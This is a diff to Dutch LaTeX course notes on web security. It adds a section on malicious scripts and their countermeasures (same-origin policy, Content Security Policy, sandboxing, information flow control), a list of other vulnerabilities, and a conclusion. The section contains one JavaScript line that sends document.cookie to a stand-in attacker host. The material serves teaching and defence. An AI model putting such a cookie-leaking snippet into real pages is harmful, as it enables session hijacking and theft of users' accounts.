@@ -229,8 +229,39 @@ Tegenmaatregelen kunnen worden genomen in de drie fasen van de ontwikkelingscycl
 Voorbeelden van dergelijke programma's zijn \textit{Fortify Source Code Analyzer}, \textit{FindBugs}, \textit{Coverity Static Analysis}. Deze software kan echter slachtoffer worden van \textit{false-positives} en \textit{false-negatives}.
 
 \subsection{Scripts}
+Hoewel de \textbf{SOP} voorkomt dat script rechtstreeks verbinding maken met server van de aanvaller kunnen script toch entiteiten aan de webpagina toevoegen die leiden tot een HTTP request naar een script-specifieke server. Als voorbeeld zien we hieronder hoe een script een cookie kan lekken naar een andere server.
+\begin{lstlisting}[caption=Javascript code om cookie te lekken]
+new Image().src = "http://attack.com/?=" + document.cookie;
+\end{lstlisting}
+Het is zelfs mogelijk voor het script om in twee richtingen te communiceren door het insluiten van een script. 
+\\\\
+Voorgaande techniek kan gebruikt worden om de session cookie te lekken. Eens hiervan in het bezit kan de aanvaller de hele sessie overnemen. Een andere aanval bestaat uit een script dat willekeurige requests stuurt naar de server van waar het script komt en op die manier bijkomende requests stuurt in de gebruikerssessie.
+
+\subsubsection{Tegenmaatregelen}
+Er zijn twee algemene tegenmaatregelen voor dit probleem:
+\begin{itemize}
+	\item Ontwerp van de JavaScript API en de browser
+	\item De \textit{Same-Origin-Policy} die wordt afgedwongen door de brwoser
+\end{itemize}
+Deze twee zullen de meeste aanvallen kunnen stoppen. Toch zijn bijkomende tegenmaatregelen belangrijk. 
+
+\begin{itemize}
+	\item Defensief programmeren aan de serverzijde om zich te beschermen tegen \textit{XSS} kwetsbaarheden.
+	\item  De \textbf{Content Security Policy} is een nieuwe \textit{W3C} standaard die toelaat aan de eigenaar van de pagina om te declareren waar de cli\"en verwacht wordt inhoud op te halen. 
+	\item \textbf{Sandboxing} van JavaScript code beperkt de mogelijhkheden van een script aan de hand van een beleid dat door de programmeur is gespecificeerd.
+	\item \textbf{Information flow security} beperkt de stroom van informatie door scripts van gevoelige bronnen naar publieke servers.
+\end{itemize}
+
 \subsection{Andere}
+Hier zijn nog enkele niet te verwaarlozen kwetsbaarheden en bijhorende voorbeelden:
+\begin{itemize}
+	\item \textbf{Zwakke toegangscontrole}: \textbf{forceful browsing}, \textit{slechte of geen beveiligingsbeleid}
+	\item \textbf{Zwakke cryptografische bescherming}: \textit{SSL stripping}, \textit{PKI fouten}.
+	\item \textbf{Fouten bij de browserimplementatie}: \textit{Drive-by-downloads}, \textit{heap spraying}
+\end{itemize}
 
 \section{Conclusies}
+We kunnen concluderen dat het web een zeer invloedrijk applicatieplatform vormt. De technologie en complexiteit ervan maakt het kwetsbaar op verschillende vakken. Kwetsbaarheden en aanvallen die we overigens ook op het mobiel platform mogen verwachten. Veel aanvalstechnieken zijn goed begrepen maar er komen er steeds nieuwe aan het oppervlak. Zoals altijd is het een race tussen aanvaller en verdediger.
+
 
 \end{document}
